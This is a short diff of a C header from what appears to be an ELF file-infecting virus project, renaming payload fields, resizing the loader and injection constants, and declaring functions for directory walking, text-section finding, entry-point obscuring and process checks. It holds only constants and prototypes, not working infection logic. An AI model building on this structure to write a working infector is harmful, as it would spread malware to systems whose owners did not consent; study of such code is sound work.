@@ -19,11 +19,11 @@
 
 # define FT_MEMCPY_ADDR 0x1300
 # define BUF_SIZE 0x20
-# define END_SIZE 0xe5
-# define LOADER_SIZE 0xe5
+# define BIS_SIZE 0xe5
+# define LOADER_SIZE 0x59
 # define PAYLOAD_SIZE 0x2ce0 - FT_MEMCPY_ADDR + 0x7
 # define MAIN_OFFSET 0x2c1e - FT_MEMCPY_ADDR
-# define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
+# define INJECT_SIZE LOADER_SIZE + SIGN_SIZE
 
 # define OFFSET_1 0x20c3 - FT_MEMCPY_ADDR
 # define OFFSET_2 0x21ea - FT_MEMCPY_ADDR
@@ -43,8 +43,8 @@ typedef struct		s_info
 
 	size_t		bss_size;
 	size_t		begin_bss;
-	size_t		offset_payload;
-	size_t		addr_payload;
+	size_t		offset_bis;
+	size_t		addr_bis;
 
 	int32_t		 valid_target;
 }					t_info;
@@ -60,7 +60,8 @@ struct linux_dirent64 {
 void		loader();
 int			main();
 void		ft_end();
-void		woody();
+void		syscalls();
+// void		woody();
 
 /*			**** FILL_BUFF ****					*/
 void		write_begin(char *buf);
@@ -76,7 +77,7 @@ void		write_stat(char *buf);
 int			find_text(t_info *info);
 void		epo_parsing(t_info *info);
 int			pe_parsing(t_info *info);
-void		patch_end(t_info *info, int32_t nb);
+void		patch_bis(t_info *info, int32_t nb);
 int			check_process(char *buf_path);
 
 /*			**** LIB HANDLERS	****			*/
